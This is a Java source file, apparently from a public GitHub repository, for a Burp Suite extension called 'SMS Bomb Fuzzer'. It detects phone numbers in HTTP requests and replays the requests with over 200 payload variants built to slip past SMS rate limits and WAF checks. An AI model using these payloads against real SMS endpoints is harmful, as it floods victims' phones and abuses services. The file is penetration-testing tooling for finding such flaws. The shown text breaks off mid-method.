package burp;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import javax.swing.*;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.TableCellEditor;
import javax.swing.table.TableCellRenderer;
import javax.swing.table.TableRowSorter;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.PrintWriter;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.stream.Collectors;

public class BurpExtender extends AbstractTableModel implements IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory {

    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;

    // UI组件
    private JSplitPane splitPane;
    private IMessageEditor requestViewer;
    private IMessageEditor responseViewer;
    private JTable originalTable; // 显示原始请求日志
    private JTable resultTable;   // 显示测试结果

    // 日志记录
    private List<OriginalLogEntry> originalLog = new ArrayList<>();
    private List<TestLogEntry> testLog = new ArrayList<>();

    // 控制面板组件
    private JButton clearListButton;
    private JButton whiteListButton;
    private JTextField whiteListField;

    // 自定义号码输入与修改按钮
    private JTextField customPhoneField;
    private JButton modifyPhoneButton;
    // 默认测试号码
    private String customPhoneNumber = "18888888888";

    // 组合测试按钮（短信接口测试已合并到 Payload 类别选择对话框）
    private JButton combineTestButton;
    // 状态变量：短信接口测试和组合测试是否启用
    // smsInterfaceTestEnabled 现由 Payload 类别选择对话框中的复选框控制
    private boolean smsInterfaceTestEnabled = false;
    private boolean combineTestEnabled = false;

    // 当前选中的原始请求，用于请求/响应查看器展示
    private IHttpRequestResponse currentlyDisplayedItem;
    private int selectedOriginalId = -1;

    // 日志编号计数器
    private int originalCounter = 0;
    private int testCounter = 0;
    public PrintWriter stdout;

    // 白名单设置：用户填写的域名列表（用逗号分隔）以及白名单开关
    private boolean whiteListEnabled = false;
    private String whiteListDomains = "";

    // 新增：用户选中的手机号列表
    private List<String> selectedNumbers = Collections.emptyList();

    // 用于中断各原始请求的测试
    private Map<Integer, AtomicBoolean> cancelFlags = new ConcurrentHashMap<>();

    // ===== Payload 类别系统 =====
    // 每个类别可由用户开关；默认全开。EnumSet 在 EDT 上读，fuzz 线程上读，仅在 UI 对话框确认时整体替换，无需额外同步。
    private enum PayloadCategory {
        ORIGINAL("原始号码"),          // 仅 "xxxxxxxxxxx"
        COMMA("逗号绕过"),              // ',' 前后缀
        WHITESPACE("空格 / %20"),       // ' ', '%20' 前后缀
        SPECIAL_CHAR("特殊字符 @#?!.+-*/"),
        NULL_NEWLINE("空字节 / 换行"),  // %00, \n, \r
        COUNTRY_CODE("号码区号"),     // +86, 0086, 86, 9986...
        WAF_BYPASS("WAF 绕过"),         // +)WAFXR#!T 与前导 0
        STATIC_EXT("静态资源后缀"),     // .js .json .html ...
        MULTI_NUMBER("多号码拼接");     // xxxxxxxxxxx,18888888888

        final String label;
        PayloadCategory(String label) { this.label = label; }
        @Override public String toString() { return label; }
    }
    // 默认全部启用，行为与未做分类前等价
    private final java.util.EnumSet<PayloadCategory> enabledPayloadCategories =
            java.util.EnumSet.allOf(PayloadCategory.class);

    // 非 PAYLOAD_PATTERNS 的独立测试类别开关（默认全开）
    // 注：URL 路径末尾 11 位号码 fuzz 不在此处 —— 用户在右键发送时已经主动选定了号码位置，
    // 所以路径里包含手机号的场景必然要测，没有必要再给一个开关
    private boolean urlEncodeTestEnabled = true;     // 渐进 URL 编码
    private boolean postExtTestEnabled = true;       // POST 路径追加静态后缀
    private boolean extraHeadersTestEnabled = true;  // IP 伪造头注入

    // 定义测试payload的模板数组（模板中出现"xxxxxxxxxxx"的部分会被替换成实际的11位数字）
    private static final String[] PAYLOAD_PATTERNS = new String[] {
            "xxxxxxxxxxx",
            "xxxxxxxxxxx,",
            "xxxxxxxxxxx,,",
            "xxxxxxxxxxx,,,",
            "xxxxxxxxxxx,,,,",
            "xxxxxxxxxxx,,,,,",
            ",,,,,xxxxxxxxxxx",
            ",,,,xxxxxxxxxxx",
            ",,,xxxxxxxxxxx",
            ",,xxxxxxxxxxx",
            ",xxxxxxxxxxx",
            " xxxxxxxxxxx",
            "  xxxxxxxxxxx",
            "   xxxxxxxxxxx",
            "%20xxxxxxxxxxx",
            "%20%20xxxxxxxxxxx",
            "%20%20%20xxxxxxxxxxx",
            "xxxxxxxxxxx ",
            "xxxxxxxxxxx  ",
            "xxxxxxxxxxx   ",
            "xxxxxxxxxxx%20",
            "xxxxxxxxxxx%20%20",
            "xxxxxxxxxxx%20%20%20",
            "@xxxxxxxxxxx",
            "@@xxxxxxxxxxx",
            "@@@xxxxxxxxxxx",
            "xxxxxxxxxxx@",
            "xxxxxxxxxxx@@",
            "xxxxxxxxxxx@@@",
            "xxxxxxxxxxx#",
            "xxxxxxxxxxx##",
            "xxxxxxxxxxx###",
            "xxxxxxxxxxx####",
            "#xxxxxxxxxxx",
            "##xxxxxxxxxxx",
            "###xxxxxxxxxxx",
            "####xxxxxxxxxxx",
            "xxxxxxxxxxx?",
            "xxxxxxxxxxx??",
            "xxxxxxxxxxx???",
            "xxxxxxxxxxx????",
            "?xxxxxxxxxxx",
            "??xxxxxxxxxxx",
            "???xxxxxxxxxxx",
            "????xxxxxxxxxxx",
            "xxxxxxxxxxx!",
            "xxxxxxxxxxx!!",
            "xxxxxxxxxxx!!!",
            "xxxxxxxxxxx!!!!",
            "!xxxxxxxxxxx",
            "!!xxxxxxxxxxx",
            "!!!xxxxxxxxxxx",
            "!!!!xxxxxxxxxxx",
            "xxxxxxxxxxx.",
            "xxxxxxxxxxx..",
            "xxxxxxxxxxx...",
            "xxxxxxxxxxx....",
            ".xxxxxxxxxxx",
            "..xxxxxxxxxxx",
            "...xxxxxxxxxxx",
            "....xxxxxxxxxxx",
            "%00xxxxxxxxxxx",
            "%00%00xxxxxxxxxxx",
            "%00%00%00xxxxxxxxxxx",
            "xxxxxxxxxxx%00",
            "xxxxxxxxxxx%00%00",
            "xxxxxxxxxxx%00%00%00",
            "xxxxxxxxxxx\\n",
            "xxxxxxxxxxx\\n\\n",
            "xxxxxxxxxxx\\n\\n\\n",
            "xxxxxxxxxxx\\n\\n\\n\\n",
            "\\nxxxxxxxxxxx",
            "\\n\\nxxxxxxxxxxx",
            "\\n\\n\\nxxxxxxxxxxx",
            "\\n\\n\\n\\nxxxxxxxxxxx",
            "xxxxxxxxxxx\\r",
            "xxxxxxxxxxx\\r\\r",
            "xxxxxxxxxxx\\r\\r\\r",
            "xxxxxxxxxxx\\r\\r\\r\\r",
            "\\rxxxxxxxxxxx",
            "\\r\\rxxxxxxxxxxx",
            "\\r\\r\\rxxxxxxxxxxx",
            "\\r\\r\\r\\rxxxxxxxxxxx",
            "xxxxxxxxxxx+",
            "xxxxxxxxxxx++",
            "xxxxxxxxxxx+++",
            "xxxxxxxxxxx++++",
            "+xxxxxxxxxxx",
            "++xxxxxxxxxxx",
            "+++xxxxxxxxxxx",
            "++++xxxxxxxxxxx",
            "xxxxxxxxxxx-",
            "xxxxxxxxxxx--",
            "xxxxxxxxxxx---",
            "xxxxxxxxxxx----",
            "-xxxxxxxxxxx",
            "--xxxxxxxxxxx",
            "---xxxxxxxxxxx",
            "----xxxxxxxxxxx",
            "xxxxxxxxxxx*",
            "xxxxxxxxxxx**",
            "xxxxxxxxxxx***",
            "xxxxxxxxxxx****",
            "*xxxxxxxxxxx",
            "**xxxxxxxxxxx",
            "***xxxxxxxxxxx",
            "****xxxxxxxxxxx",
            "xxxxxxxxxxx/",
            "xxxxxxxxxxx//",
            "xxxxxxxxxxx///",
            "xxxxxxxxxxx////",
            "/xxxxxxxxxxx",
            "//xxxxxxxxxxx",
            "///xxxxxxxxxxx",
            "////xxxxxxxxxxx",
            "+86xxxxxxxxxxx",
            "+86 xxxxxxxxxxx",
            "+86%20xxxxxxxxxxx",
            "+12xxxxxxxxxxx",
            "+12 xxxxxxxxxxx",
            "+12%20xxxxxxxxxxx",
            "+852xxxxxxxxxxx",
            "+852 xxxxxxxxxxx",
            "+852%20xxxxxxxxxxx",
            "+853xxxxxxxxxxx",
            "+853 xxxxxxxxxxx",
            "+853%20xxxxxxxxxxx",
            "0086xxxxxxxxxxx",
            "0086 xxxxxxxxxxx",
            "0086%20xxxxxxxxxxx",
            "0012xxxxxxxxxxx",
            "0012 xxxxxxxxxxx",
            "0012%20xxxxxxxxxxx",
            "00852xxxxxxxxxxx",
            "00852 xxxxxxxxxxx",
            "00852%20xxxxxxxxxxx",
            "00853xxxxxxxxxxx",
            "00853 xxxxxxxxxxx",
            "00853%20xxxxxxxxxxx",
            "9986xxxxxxxxxxx",
            "9986 xxxxxxxxxxx",
            "9986%20xxxxxxxxxxx",
            "9912xxxxxxxxxxx",
            "9912 xxxxxxxxxxx",
            "9912%20xxxxxxxxxxx",
            "99852xxxxxxxxxxx",
            "99852 xxxxxxxxxxx",
            "99852%20xxxxxxxxxxx",
            "99853xxxxxxxxxxx",
            "99853 xxxxxxxxxxx",
            "99853%20xxxxxxxxxxx",
            "86xxxxxxxxxxx",
            "86 xxxxxxxxxxx",
            "86%20xxxxxxxxxxx",
            "12xxxxxxxxxxx",
            "12 xxxxxxxxxxx",
            "12%20xxxxxxxxxxx",
            "852xxxxxxxxxxx",
            "852 xxxxxxxxxxx",
            "852%20xxxxxxxxxxx",
            "853xxxxxxxxxxx",
            "853 xxxxxxxxxxx",
            "853%20xxxxxxxxxxx",
            "086xxxxxxxxxxx",
            "086 xxxxxxxxxxx",
            "086%20xxxxxxxxxxx",
            "012xxxxxxxxxxx",
            "012 xxxxxxxxxxx",
            "012%20xxxxxxxxxxx",
            "0852xxxxxxxxxxx",
            "0852 xxxxxxxxxxx",
            "0852%20xxxxxxxxxxx",
            "0853xxxxxxxxxxx",
            "0853 xxxxxxxxxxx",
            "0853%20xxxxxxxxxxx",
            "%86xxxxxxxxxxx",
            "%86 xxxxxxxxxxx",
            "%86%2%xxxxxxxxxxx",
            "%12xxxxxxxxxxx",
            "%12 xxxxxxxxxxx",
            "%12%2%xxxxxxxxxxx",
            "%852xxxxxxxxxxx",
            "%852 xxxxxxxxxxx",
            "%852%2%xxxxxxxxxxx",
            "%853xxxxxxxxxxx",
            "%853 xxxxxxxxxxx",
            "%853%2%xxxxxxxxxxx",
            " 0xxxxxxxxxxx",
            "%200xxxxxxxxxxx",
            "0xxxxxxxxxxx",
            "00xxxxxxxxxxx",
            "000xxxxxxxxxxx",
            "0000xxxxxxxxxxx",
            "00000xxxxxxxxxxx",
            "+)WAFXR#!Txxxxxxxxxxx",
            "xxxxxxxxxxx+)WAFXR#!T",
            "xxxxxxxxxxx.js",
            "xxxxxxxxxxx.json",
            "xxxxxxxxxxx.html",
            "xxxxxxxxxxx.css",
            "xxxxxxxxxxx.jpg",
            "xxxxxxxxxxx.png",
            "xxxxxxxxxxx.icon",
            "xxxxxxxxxxx.txt",
            "xxxxxxxxxxx.mp3",
            "xxxxxxxxxxx.mp4",
            "xxxxxxxxxxx.0",
            "xxxxxxxxxxx.1",
            "xxxxxxxxxxx.2",
            "xxxxxxxxxxx.3",
            "xxxxxxxxxxx,18888888888",
            "xxxxxxxxxxx,,18888888888",
            "xxxxxxxxxxx,,,18888888888",
            "xxxxxxxxxxx&18888888888",
            "xxxxxxxxxxx&&18888888888",
            "xxxxxxxxxxx&&&18888888888",
            "xxxxxxxxxxx&&&&18888888888",
    };

    // 与 PAYLOAD_PATTERNS 等长、按相同顺序对应的类别。在 static 块中按段填充。
    private static final PayloadCategory[] PAYLOAD_CATEGORIES = new PayloadCategory[PAYLOAD_PATTERNS.length];
    static {
        PayloadCategory[] c = PAYLOAD_CATEGORIES;
        // 按段填充，索引区间见 PAYLOAD_PATTERNS 注释
        c[0] = PayloadCategory.ORIGINAL;
        for (int i = 1; i <= 10; i++)   c[i] = PayloadCategory.COMMA;
        for (int i = 11; i <= 22; i++)  c[i] = PayloadCategory.WHITESPACE;
        for (int i = 23; i <= 60; i++)  c[i] = PayloadCategory.SPECIAL_CHAR;   // @ # ? ! .
        for (int i = 61; i <= 82; i++)  c[i] = PayloadCategory.NULL_NEWLINE;   // %00 \n \r
        for (int i = 83; i <= 114; i++) c[i] = PayloadCategory.SPECIAL_CHAR;   // + - * /
        for (int i = 115; i <= 186; i++) c[i] = PayloadCategory.COUNTRY_CODE;
        for (int i = 187; i <= 195; i++) c[i] = PayloadCategory.WAF_BYPASS;
        for (int i = 196; i <= 209; i++) c[i] = PayloadCategory.STATIC_EXT;
        for (int i = 210; i <= 216; i++) c[i] = PayloadCategory.MULTI_NUMBER;
        // 一致性自检：发现未归类的索引时打印到控制台，避免静默漏归
        for (int i = 0; i < c.length; i++) {
            if (c[i] == null) {
                System.err.println("[SMS Bomb Fuzzer] PAYLOAD_CATEGORIES[" + i + "] not classified for: " + PAYLOAD_PATTERNS[i]);
            }
        }
    }

    @Override
    public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks) {
        // 输出
        this.stdout = new PrintWriter(callbacks.getStdout(), true);
        this.stdout.println("[+] ####################################");
        this.stdout.println("[+] SMS Bomb Fuzzer!");
        this.stdout.println("[+] version:4.0");
        this.stdout.println("[+] author:昱子");
        this.stdout.println("[+] Blog:https://blog.yuzisec.xyz");
        this.stdout.println("[+] Github:https://github.com/yuziiiiiiiiii/SMS_Bomb_Fuzzer");
        this.stdout.println("[+] ####################################");
        this.stdout.println("[+] Enjoy it~");
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        callbacks.setExtensionName("SMS Bomb Fuzzer");

        // 构建UI（在Swing线程中执行）
        SwingUtilities.invokeLater(new Runnable() {
            public void run() {
                // 创建请求/响应查看器
                requestViewer = callbacks.createMessageEditor(BurpExtender.this, false);
                responseViewer = callbacks.createMessageEditor(BurpExtender.this, false);

                // 创建日志表格
                originalTable = new JTable(BurpExtender.this);
                resultTable = new JTable(new ResultTableModel());

                // 启用自动排序
                TableRowSorter<ResultTableModel> sorter = new TableRowSorter<>((ResultTableModel) resultTable.getModel());
                // 为“响应长度”（列索引 2）、“耗时(ms)”（列索引 3）、“响应码”（列索引 4）等数值列设置比较器
                sorter.setComparator(2, Comparator.comparingInt(o -> (Integer) o));
                sorter.setComparator(3, Comparator.comparingInt(o -> (Integer) o));
                sorter.setComparator(4, Comparator.comparingInt(o -> (Integer) o));
                // 安装 sorter
                resultTable.setRowSorter(sorter);

                // 原始日志表格选择时更新测试结果表和请求/响应查看器
                originalTable.getSelectionModel().addListSelectionListener(e -> {
                    int selectedRow = originalTable.getSelectedRow();
                    if (selectedRow >= 0 && selectedRow < originalLog.size()) {
                        selectedOriginalId = originalLog.get(selectedRow).id;
                        ((ResultTableModel)resultTable.getModel()).setFilter(selectedOriginalId);
                        // 清除排序（可选）
                        sorter.setSortKeys(null);
                        OriginalLogEntry entry = originalLog.get(selectedRow);
                        requestViewer.setMessage(entry.requestResponse.getRequest(), true);
                        responseViewer.setMessage(entry.requestResponse.getResponse(), false);
                        currentlyDisplayedItem = entry.requestResponse;
                    }
                });

                // 原始请求表格的右键菜单：删除选中的若干行（级联删除其下所有测试结果）
                JPopupMenu originalPopup = new JPopupMenu();
                JMenuItem deleteOrigItem = new JMenuItem("删除选中（含其测试结果）");
                deleteOrigItem.addActionListener(e -> deleteSelectedOriginalRows());
                originalPopup.add(deleteOrigItem);
                originalTable.setComponentPopupMenu(originalPopup);
                // 右键点击时：如果点中的行不在已选区域内，则将它选中。
                // 注意：originalTable 的第 3 列是"操作"按钮（自定义编辑器），右键不应触发它的 ActionListener。
                // 我们只在非操作列上做"右键自动选中"，避免和按钮编辑器抢事件。
                originalTable.addMouseListener(new java.awt.event.MouseAdapter() {
                    @Override
                    public void mousePressed(java.awt.event.MouseEvent ev) { handle(ev); }
                    @Override
                    public void mouseReleased(java.awt.event.MouseEvent ev) { handle(ev); }
                    private void handle(java.awt.event.MouseEvent ev) {
                        if (!ev.isPopupTrigger()) return;
                        int row = originalTable.rowAtPoint(ev.getPoint());
                        if (row < 0) return;
                        if (!originalTable.isRowSelected(row)) {
                            originalTable.setRowSelectionInterval(row, row);
                        }
                    }
                });

                // 测试结果表格选择时更新请求/响应查看器
                // 注意：表格装了 TableRowSorter，视图行号 != 模型行号，需要通过 convertRowIndexToModel 转换
                resultTable.getSelectionModel().addListSelectionListener(e -> {
                    int viewRow = resultTable.getSelectedRow();
                    if (viewRow < 0) return;
                    int modelRow = resultTable.convertRowIndexToModel(viewRow);
                    List<TestLogEntry> filtered = getFilteredTestLog();
                    if (modelRow >= 0 && modelRow < filtered.size()) {
                        TestLogEntry entry = filtered.get(modelRow);
                        requestViewer.setMessage(entry.requestResponse.getRequest(), true);
                        responseViewer.setMessage(entry.requestResponse.getResponse(), false);
                        currentlyDisplayedItem = entry.requestResponse;
                    }
                });

                // 测试结果表格的右键菜单：删除选中的若干条记录
                JPopupMenu resultPopup = new JPopupMenu();
                JMenuItem deleteItem = new JMenuItem("删除选中");
                deleteItem.addActionListener(e -> deleteSelectedTestRows());
                resultPopup.add(deleteItem);
                resultTable.setComponentPopupMenu(resultPopup);
                // 右键点击时：如果点中的行不在已选区域内，则将它选中（与常见 IDE 行为一致）
                resultTable.addMouseListener(new java.awt.event.MouseAdapter() {
                    @Override
                    public void mousePressed(java.awt.event.MouseEvent ev) { handle(ev); }
                    @Override
                    public void mouseReleased(java.awt.event.MouseEvent ev) { handle(ev); }
                    private void handle(java.awt.event.MouseEvent ev) {
                        if (!ev.isPopupTrigger()) return;
                        int row = resultTable.rowAtPoint(ev.getPoint());
                        if (row < 0) return;
                        if (!resultTable.isRowSelected(row)) {
                            resultTable.setRowSelectionInterval(row, row);
                        }
                    }
                });

                // 构建展示信息面板：每行用 selectableLabel 替代 JLabel，让用户能选中文本进行复制
                JPanel headerPanel = new JPanel(new GridLayout(5, 1));
                headerPanel.add(selectableLabel("名称：SMS Bomb Fuzzer"));
                headerPanel.add(selectableLabel("博客：https://blog.yuzisec.xyz"));
                headerPanel.add(selectableLabel("作者：昱子"));
                headerPanel.add(selectableLabel("Github：https://github.com/yuziiiiiiiiii/SMS_Bomb_Fuzzer"));
                headerPanel.add(selectableLabel("版本：V4.0"));

                // 构建控制面板

                clearListButton = new JButton("清空列表");
                clearListButton.addActionListener(new ActionListener() {
                    public void actionPerformed(ActionEvent e) {
                        originalLog.clear();
                        testLog.clear();
                        originalCounter = 0;
                        testCounter = 0;
                        fireTableDataChanged();
                        ((ResultTableModel)resultTable.getModel()).fireTableDataChanged();
                    }
                });

                whiteListButton = new JButton("启动白名单");
                whiteListButton.addActionListener(new ActionListener() {
                    public void actionPerformed(ActionEvent e) {
                        if (whiteListEnabled) {
                            whiteListEnabled = false;
                            whiteListButton.setText("启动白名单");
                            whiteListField.setEditable(true);
                            whiteListField.setForeground(Color.BLACK);
                        } else {
                            whiteListEnabled = true;
                            whiteListButton.setText("关闭白名单");
                            whiteListDomains = whiteListField.getText();
                            whiteListField.setEditable(false);
                            whiteListField.setForeground(Color.GRAY);
                        }
                    }
                });

                whiteListField = new JTextField("填写白名单域名", 20);

                // 自定义号码输入框和修改按钮
                customPhoneField = new JTextField("18888888888", 20);
                modifyPhoneButton = new JButton("修改测试number");
                modifyPhoneButton.addActionListener(new ActionListener() {
                    public void actionPerformed(ActionEvent e) {
                        String input = customPhoneField.getText().trim();
                        if (!input.isEmpty()) {
                            customPhoneNumber = input;
                        } else {
                            customPhoneNumber = "18888888888";
                        }
                        callbacks.printOutput("自定义测试号码更新为：" + customPhoneNumber);
                    }
                });

                // 组合测试按钮
                combineTestButton = new JButton("组合测试");
                combineTestButton.addActionListener(new ActionListener() {
                    public void actionPerformed(ActionEvent e) {
                        combineTestEnabled = !combineTestEnabled;
                        combineTestButton.setText(combineTestEnabled ? "关闭组合测试" : "组合测试");
                        callbacks.printOutput("组合测试 " + (combineTestEnabled ? "启用" : "关闭"));
                    }
                });

                // Payload 类别选择按钮：弹对话框让用户多选启用哪些类别
                JButton categorySelectButton = new JButton("测试类别选择");
                categorySelectButton.addActionListener(new ActionListener() {
                    public void actionPerformed(ActionEvent e) {
                        showPayloadCategoryDialog();
                    }
                });

                JPanel controlPanel = new JPanel();
                controlPanel.setLayout(new BoxLayout(controlPanel, BoxLayout.Y_AXIS));

                // 第一行：其他按钮，水平排列（靠左）
                JPanel firstRow = new JPanel(new FlowLayout(FlowLayout.LEFT));
                firstRow.add(clearListButton);
                firstRow.add(whiteListField);
                firstRow.add(whiteListButton);
                firstRow.add(customPhoneField);
                firstRow.add(modifyPhoneButton);
                controlPanel.add(firstRow);

                // 第二行："组合测试"、"Payload类别选择"，水平居中排列
                JPanel secondRow = new JPanel(new FlowLayout(FlowLayout.CENTER));
                secondRow.add(combineTestButton);
                secondRow.add(categorySelectButton);
                controlPanel.add(secondRow);



                // 将展示信息面板和控制面板组合
                JPanel topPanel = new JPanel();
                topPanel.setLayout(new BoxLayout(topPanel, BoxLayout.Y_AXIS));
                topPanel.add(headerPanel);
                topPanel.add(controlPanel);

                // 构建日志表格面板（上部：原始请求，下部：测试结果）
                JSplitPane tableSplitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
                JScrollPane originalScrollPane = new JScrollPane(originalTable);
                JScrollPane resultScrollPane = new JScrollPane(resultTable);
                tableSplitPane.setTopComponent(originalScrollPane);
                tableSplitPane.setBottomComponent(resultScrollPane);
                tableSplitPane.setDividerLocation(200);

                // 请求/响应查看器标签页
                JTabbedPane viewerTabs = new JTabbedPane();
                viewerTabs.addTab("Request", requestViewer.getComponent());
                viewerTabs.addTab("Response", responseViewer.getComponent());

                // 右侧面板：展示信息+控制面板 + 查看器
                JPanel rightPanel = new JPanel(new BorderLayout());
                rightPanel.add(topPanel, BorderLayout.NORTH);
                rightPanel.add(viewerTabs, BorderLayout.CENTER);

                // 主面板：左侧为日志表格，右侧为右侧面板
                splitPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT, tableSplitPane, rightPanel);
                splitPane.setDividerLocation(600);


                // 1) 渲染器：把非 null 文本渲染为 JButton
                class ButtonRenderer extends JButton implements TableCellRenderer {
                    public ButtonRenderer() { setOpaque(true); }
                    @Override
                    public Component getTableCellRendererComponent(JTable table, Object val,
                                                                   boolean isSel, boolean hasFocus, int row, int col) {
                        if (val != null) {
                            setText(val.toString());
                            setEnabled(true);
                        } else {
                            setText("");
                            setEnabled(false);
                        }
                        return this;
                    }
                }

                // 2) 编辑器：点击即触发取消动作
                class ButtonEditor extends AbstractCellEditor implements TableCellEditor {
                    private JButton button = new JButton();
                    private int currentRow;
                    public ButtonEditor() {
                        button.addActionListener(e -> {
                            int origId = (int) originalTable.getValueAt(currentRow, 0);
                            // 触发取消
                            cancelFlags.get(origId).set(true);
                            // 更新状态
                            originalLog.stream()
                                    .filter(entry -> entry.id == origId)
                                    .forEach(entry -> entry.state = "测试完毕");
                            fireTableDataChanged();
                            // 结束编辑
                            stopCellEditing();
                        });
                    }
                    @Override
                    public Component getTableCellEditorComponent(JTable table, Object val,
                                                                 boolean isSel, int row, int col) {
                        currentRow = row;
                        button.setText(val == null ? "" : val.toString());
                        button.setEnabled(val != null);
                        return button;
                    }
                    @Override
                    public Object getCellEditorValue() { return button.getText(); }
                }
                // 在 originalTable 创建之后，立刻注册渲染器 & 编辑器：
                originalTable.getColumnModel().getColumn(3)
                        .setCellRenderer(new ButtonRenderer());
                originalTable.getColumnModel().getColumn(3)
                        .setCellEditor(new ButtonEditor());


                callbacks.customizeUiComponent(splitPane);
                callbacks.addSuiteTab(BurpExtender.this);
            }
        });

        // 注册右键菜单扩展
        callbacks.registerContextMenuFactory(this);
    }

    // ITab接口方法
    @Override
    public String getTabCaption() {
        return "SMS Bomb Fuzzer";
    }

    @Override
    public Component getUiComponent() {
        return splitPane;
    }

    // IMessageEditorController接口方法
    @Override
    public byte[] getRequest() {
        return (currentlyDisplayedItem != null) ? currentlyDisplayedItem.getRequest() : null;
    }

    @Override
    public byte[] getResponse() {
        return (currentlyDisplayedItem != null) ? currentlyDisplayedItem.getResponse() : null;
    }

    @Override
    public IHttpService getHttpService() {
        return (currentlyDisplayedItem != null) ? currentlyDisplayedItem.getHttpService() : null;
    }

    // IContextMenuFactory接口方法，添加右键菜单“Send to SMS Bomb Fuzzer”
    @Override
    public List<JMenuItem> createMenuItems(IContextMenuInvocation invocation) {
        List<JMenuItem> menuItems = new ArrayList<>();
        final IHttpRequestResponse[] selectedMessages = invocation.getSelectedMessages();
        if (selectedMessages != null && selectedMessages.length > 0) {
            JMenuItem menuItem = new JMenuItem("Send to SMS Bomb Fuzzer");
            menuItem.addActionListener(new ActionListener() {
                public void actionPerformed(ActionEvent e) {
                    new Thread(new Runnable() {
                        public void run() {
                            checkPayloads(selectedMessages[0]);
                        }
                    }).start();
                }
            });
            menuItems.add(menuItem);
        }
        return menuItems;
    }

    /**
     * 判断是否为测试候选的手机号：
     * 1. 纯11位数字
     * 2. 11位中含有至少一个数字和至少一个*，且不能全为*
     * 3. 以+86或86开头，后跟11位数字
     */
    private boolean isPhoneTestCandidate(String value) {
        if (value == null) {
            return false;
        }
        // 纯11位数字
        if (value.matches("^\\d{11}$")) {
            return true;
        }
        // 11位字符，包含至少一个数字和至少一个*，但不能全为*
        if (value.matches("^(?=.*\\d)(?=.*\\*)(?!^\\*+$)[\\d\\*]{11}$")) {
            return true;
        }
        // 前缀为+86或86，后跟11位数字（如+8618888888888或8618888888888）
        if (value.matches("^(\\+86|86)\\d{11}$")) {
            return true;
        }
        return false;
    }


    /**
     * 递归遍历 JSONObject/JSONArray，把所有 isPhoneTestCandidate 的字符串收集到 candidates 中
     */
    private void collectJsonPhoneCandidates(Object json, List<String> candidates) {
        if (json instanceof JSONObject) {
            JSONObject obj = (JSONObject) json;
            for (String k : obj.keySet()) {
                Object v = obj.get(k);
                if (v instanceof String || v instanceof Number) {
                    String s = v.toString();
                    if (isPhoneTestCandidate(s) && !candidates.contains(s)) {
                        candidates.add(s);
                    }
                } else {
                    collectJsonPhoneCandidates(v, candidates);
                }
            }
        } else if (json instanceof JSONArray) {
            JSONArray arr = (JSONArray) json;
            for (int i = 0; i < arr.length(); i++) {
                collectJsonPhoneCandidates(arr.get(i), candidates);
            }
        }
    }


    /**
     * 核心方法：对传入的请求进行处理
     * 1、先判断白名单（如果启用）
     * 2、记录原始请求
     * 3、遍历请求参数，对于任一参数满足值正好为11位数字（无论数字型或字符型）的条件，生成一系列测试payload，
     *    对于普通参数直接构造新请求；对于JSON格式则递归解析、修改后构造新请求
     * 4、发送测试请求，记录响应时间、响应包长度和状态码，将测试结果写入日志
     * 5、如果至少有一次测试执行，则更新原始请求状态为“测试完毕”
     */
    private void checkPayloads(IHttpRequestResponse baseRequestResponse) {
        // —— 新增：收集所有符合条件的手机号
        IRequestInfo ri = helpers.analyzeRequest(baseRequestResponse);
        List<IParameter> params = ri.getParameters();
        List<String> phoneCandidates = new ArrayList<>();

        // 1. 从 URL/Body/Cookie 参数收集
        for (IParameter p : params) {
            String v = String.valueOf(p.getValue());
            if (isPhoneTestCandidate(v) && !phoneCandidates.contains(v)) {
                phoneCandidates.add(v);
            }
        }

        // 2. 如果是 JSON 请求，再从 JSON 结构中收集
        List<String> head = ri.getHeaders();
        boolean isjson = head.stream().anyMatch(h -> h.toLowerCase().contains("application/json"));
        if (isjson) {
            byte[] req = baseRequestResponse.getRequest();
            int bodyOffset = ri.getBodyOffset();
            String body = helpers.bytesToString(Arrays.copyOfRange(req, bodyOffset, req.length)).trim();
            try {
                Object json = parseJson(body);
                collectJsonPhoneCandidates(json, phoneCandidates);
            } catch (JSONException ex) {
                callbacks.printOutput("JSON 解析失败，无法收集 JSON 中的手机号：" + ex.getMessage());
            }
        }

        // 3. 从 URL 路径提取 11 位数字
        String url_path = ri.getUrl().getPath();
        for (String segment : url_path.split("/")) {
            if (isPhoneTestCandidate(segment) && !phoneCandidates.contains(segment)) {
                phoneCandidates.add(segment);
            }
        }

        // 4. 弹框让用户多选
        if (phoneCandidates.isEmpty()) {
            // 弹窗提示
            JOptionPane.showMessageDialog(
                    null,
                    "未检测到可测试的手机号",
                    "提示",
                    JOptionPane.INFORMATION_MESSAGE
            );
            return;
        }
        selectedNumbers = showPhoneSelectionDialog(phoneCandidates);
        if (selectedNumbers.isEmpty()) {
            callbacks.printOutput("未选择手机号，停止 Fuzz。");
            return;
        }



        // 白名单过滤
        URL url = helpers.analyzeRequest(baseRequestResponse).getUrl();
        String urlStr = url.toString();
        if (whiteListEnabled) {
            boolean allowed = false;
            String[] domains = whiteListDomains.split(",");
            for (String domain : domains) {
                if (urlStr.contains(domain.trim())) {
                    allowed = true;
                    break;
                }
            }
            if (allowed) {
                callbacks.printOutput("停止测试，由于请求URL在白名单内：" + urlStr);
                return;
            }
        }

        // 保存原始请求（调用saveBuffersToTempFiles确保保存副本）
        IHttpRequestResponsePersisted persistedOriginal = callbacks.saveBuffersToTempFiles(baseRequestResponse);
        OriginalLogEntry origEntry = new OriginalLogEntry(originalCounter++, baseRequestResponse.getHttpService(), url, persistedOriginal, "测试中...");
        originalLog.add(origEntry);
        fireTableDataChanged();
        // 在 EDT 更新原始请求表格，以便能看到新行
        SwingUtilities.invokeLater(() -> {
            fireTableDataChanged();
            // 自动选中最后一行（即新加入的 origEntry）
            int rowIndex = originalLog.size() - 1;
            if (rowIndex >= 0) {
                originalTable.getSelectionModel().setSelectionInterval(rowIndex, rowIndex);
                // 触发 selection listener，将 selectedOriginalId 设为 origEntry.id
                // 以及 resultTable.setFilter(origEntry.id)
            }
        });
        // —— 在 origEntry 可见后，才能使用它的 id ——
        // 初始化当前请求的取消标志，用于后续循环检查
